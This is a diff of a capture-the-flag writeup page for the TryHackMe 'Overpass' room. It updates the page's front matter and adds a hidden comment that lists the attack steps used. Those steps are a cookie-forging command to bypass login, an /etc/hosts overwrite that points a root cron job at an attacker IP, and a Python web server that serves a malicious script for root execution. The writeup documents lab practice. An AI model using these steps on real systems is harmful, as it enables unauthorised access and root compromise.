@@ -1,17 +1,25 @@
 ---
-layout: default
-title: Overpass
+layout: single
+title: "Overpass"
+link: "https://tryhackme.com/room/overpass"
 parent: TryHackMe
+os: Linux
+difficulty: Easy
+tags: [Nmap, Gobuster, John, Python, Cron, Feroxbuster]
+starred: false
+date: 2025-11-12
+toc: true
+toc_sticky: true
+toc_label: "Mission Log"
+toc_icon: "crosshairs"
 ---
-# CTF Writeup: [Overpass](https://tryhackme.com/room/overpass)
-![Category](https://img.shields.io/badge/Category-Source%20Code%20%2F%20Web-blue)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
-![Tags](https://img.shields.io/badge/Tags-Cookie%20Manipulation%20%7C%20Golang-orange)
+# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
+{% include ctf-badges.html %}
 
-> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
-> **OS:** Linux |
-> **Difficulty:** Easy |
-> **Date:** 12.11.2025 |
+> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
+> **OS:** {{ page.os }} |
+> **Difficulty:** {{ page.difficulty }} |
+> **Date:** {{ page.date }} |
 > **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)
 
 ---
@@ -320,4 +328,19 @@ thm{7f33...53bb}
 ```
 
 ---
-<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
+
+{% comment %}
+
+[Technique]: Cookie Manipulation
+[Command]: document.cookie="SessionToken=Anything"
+[Why]: Bypassed login logic by manually setting a session cookie in the browser console.
+
+[Technique]: Cron Job Poisoning (Hosts)
+[Command]: echo "<AttackerIP> overpass.thm" > /etc/hosts
+[Why]: Redirected the domain used by an internal cron job to my attacker machine.
+
+[Technique]: Malicious File Hosting
+[Command]: sudo python3 -m http.server 80
+[Why]: Hosted a malicious bash script that the poisoned cron job downloaded and executed as root.
+
+{% endcomment %}
